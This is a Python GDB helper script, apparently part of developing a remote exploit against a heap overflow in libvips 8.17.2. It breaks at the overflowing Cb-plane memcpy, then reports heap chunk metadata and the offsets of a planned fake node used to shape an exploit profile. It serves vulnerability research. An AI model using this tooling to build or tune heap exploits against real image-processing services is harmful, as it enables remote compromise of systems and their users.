"""Stop before the overflowing Cb copy and report relative heap layout.

This runs only in the diagnostic image. Reported runtime addresses are never
consumed by the remote exploit; they are used to derive profile relationships.
"""

from __future__ import annotations

import json
import os

import gdb


COPY_MEMCPY_CALL = 0x9220AC
VIPS_TEXT_VADDR = 0x10C000
CANVAS_CHROMA_HEIGHT = int(
    os.environ.get("KAN2162_CANVAS_CHROMA_HEIGHT", "66"), 0,
)
FAKE_CANVAS_ROW = int(os.environ.get("KAN2162_FAKE_CANVAS_ROW", "51"), 0)


def qword(address: int) -> int:
    data = gdb.selected_inferior().read_memory(address, 8).tobytes()
    return int.from_bytes(data, "little")


class FinalCbCopy(gdb.Breakpoint):
    def __init__(self, address: int):
        super().__init__(f"*{address:#x}", internal=True)

    def stop(self) -> bool:
        length = int(gdb.parse_and_eval("$rdx"))
        if length not in (58, 59):
            return False
        destination = int(gdb.parse_and_eval("$rdi"))
        try:
            successor_size_and_flags = qword(destination + 24)
            root = destination + 32
            right = qword(root + 24)
            cr_mem = qword(right + 64)
        except gdb.MemoryError:
            return False
        plane = destination - CANVAS_CHROMA_HEIGHT * 64
        candidate = plane + FAKE_CANVAS_ROW * 64
        result = {
            "bad_row": hex(destination),
            "copy_length": length,
            "successor_size_and_flags": hex(successor_size_and_flags),
            "plane_start": hex(plane),
            "fake_node": hex(candidate),
            "fake_node_low16": hex(candidate & 0xFFFF),
            "cb_root": hex(root),
            "root_right_cr_node": hex(right),
            "cr_mem": hex(cr_mem),
            "fake_node_from_plane": hex(candidate - plane),
            "fake_node_from_bad_row": hex(candidate - destination),
            "root_from_bad_row": hex(root - destination),
        }
        print("KAN2162_PARTIAL " + json.dumps(result, sort_keys=True))
        return True


def new_objfile(event: gdb.NewObjFileEvent) -> None:
    filename = event.new_objfile.filename or ""
    if not filename.endswith("libvips-cpp.so.8.17.2"):
        return
    shared = gdb.execute("info sharedlibrary libvips-cpp", to_string=True)
    for line in shared.splitlines():
        if "libvips-cpp.so.8.17.2" in line:
            # GDB's From column begins at the executable PT_LOAD segment,
            # while COPY_MEMCPY_CALL is relative to the ELF load base.
            address = (
                int(line.split()[0], 16)
                - VIPS_TEXT_VADDR
                + COPY_MEMCPY_CALL
            )
            print(f"KAN2162_BREAKPOINT final_cb_copy={address:#x}")
            FinalCbCopy(address)
            return
    raise gdb.GdbError("could not resolve bundled libvips load base")


gdb.events.new_objfile.connect(new_objfile)
